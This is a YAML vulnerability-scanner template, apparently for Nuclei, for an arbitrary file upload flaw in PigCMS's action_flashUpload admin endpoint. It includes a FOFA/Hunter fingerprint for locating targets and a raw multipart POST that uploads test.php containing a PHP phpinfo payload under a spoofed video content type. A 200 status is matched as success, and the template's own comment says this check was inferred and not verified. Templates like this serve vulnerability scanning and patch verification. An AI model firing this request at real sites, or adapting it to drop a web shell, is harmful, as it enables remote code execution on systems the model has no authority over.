id: poc-4887371f9f5a46c0cb93
info:
  name: PigCMSaction_flashUpload任意文件上传漏洞
  author: hacktwo
  severity: high
  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/4887371f9f5a46c0cb931daef6cebb93

    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,2025
  metadata:
    source: yuque-hacktwo-dtdx2v
    doc-slug: 4887371f9f5a46c0cb931daef6cebb93
    fofa: + hunter`web.body="/tpl/Home/pigcms/common/js/daohang.js"`
http:
- raw:
  - 'POST /cms/manage/admin.php?m=manage&c=background&a=action_flashUpload HTTP/1.1

    Host: {{Hostname}}

    Accept-Encoding: gzip, deflate

    Content-Type: multipart/form-data; boundary=----aaa


    ------aaa

    Content-Disposition: form-data; name="filePath"; filename="test.php"

    Content-Type: video/x-flv


    <?php phpinfo();?>

    ------aaa'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
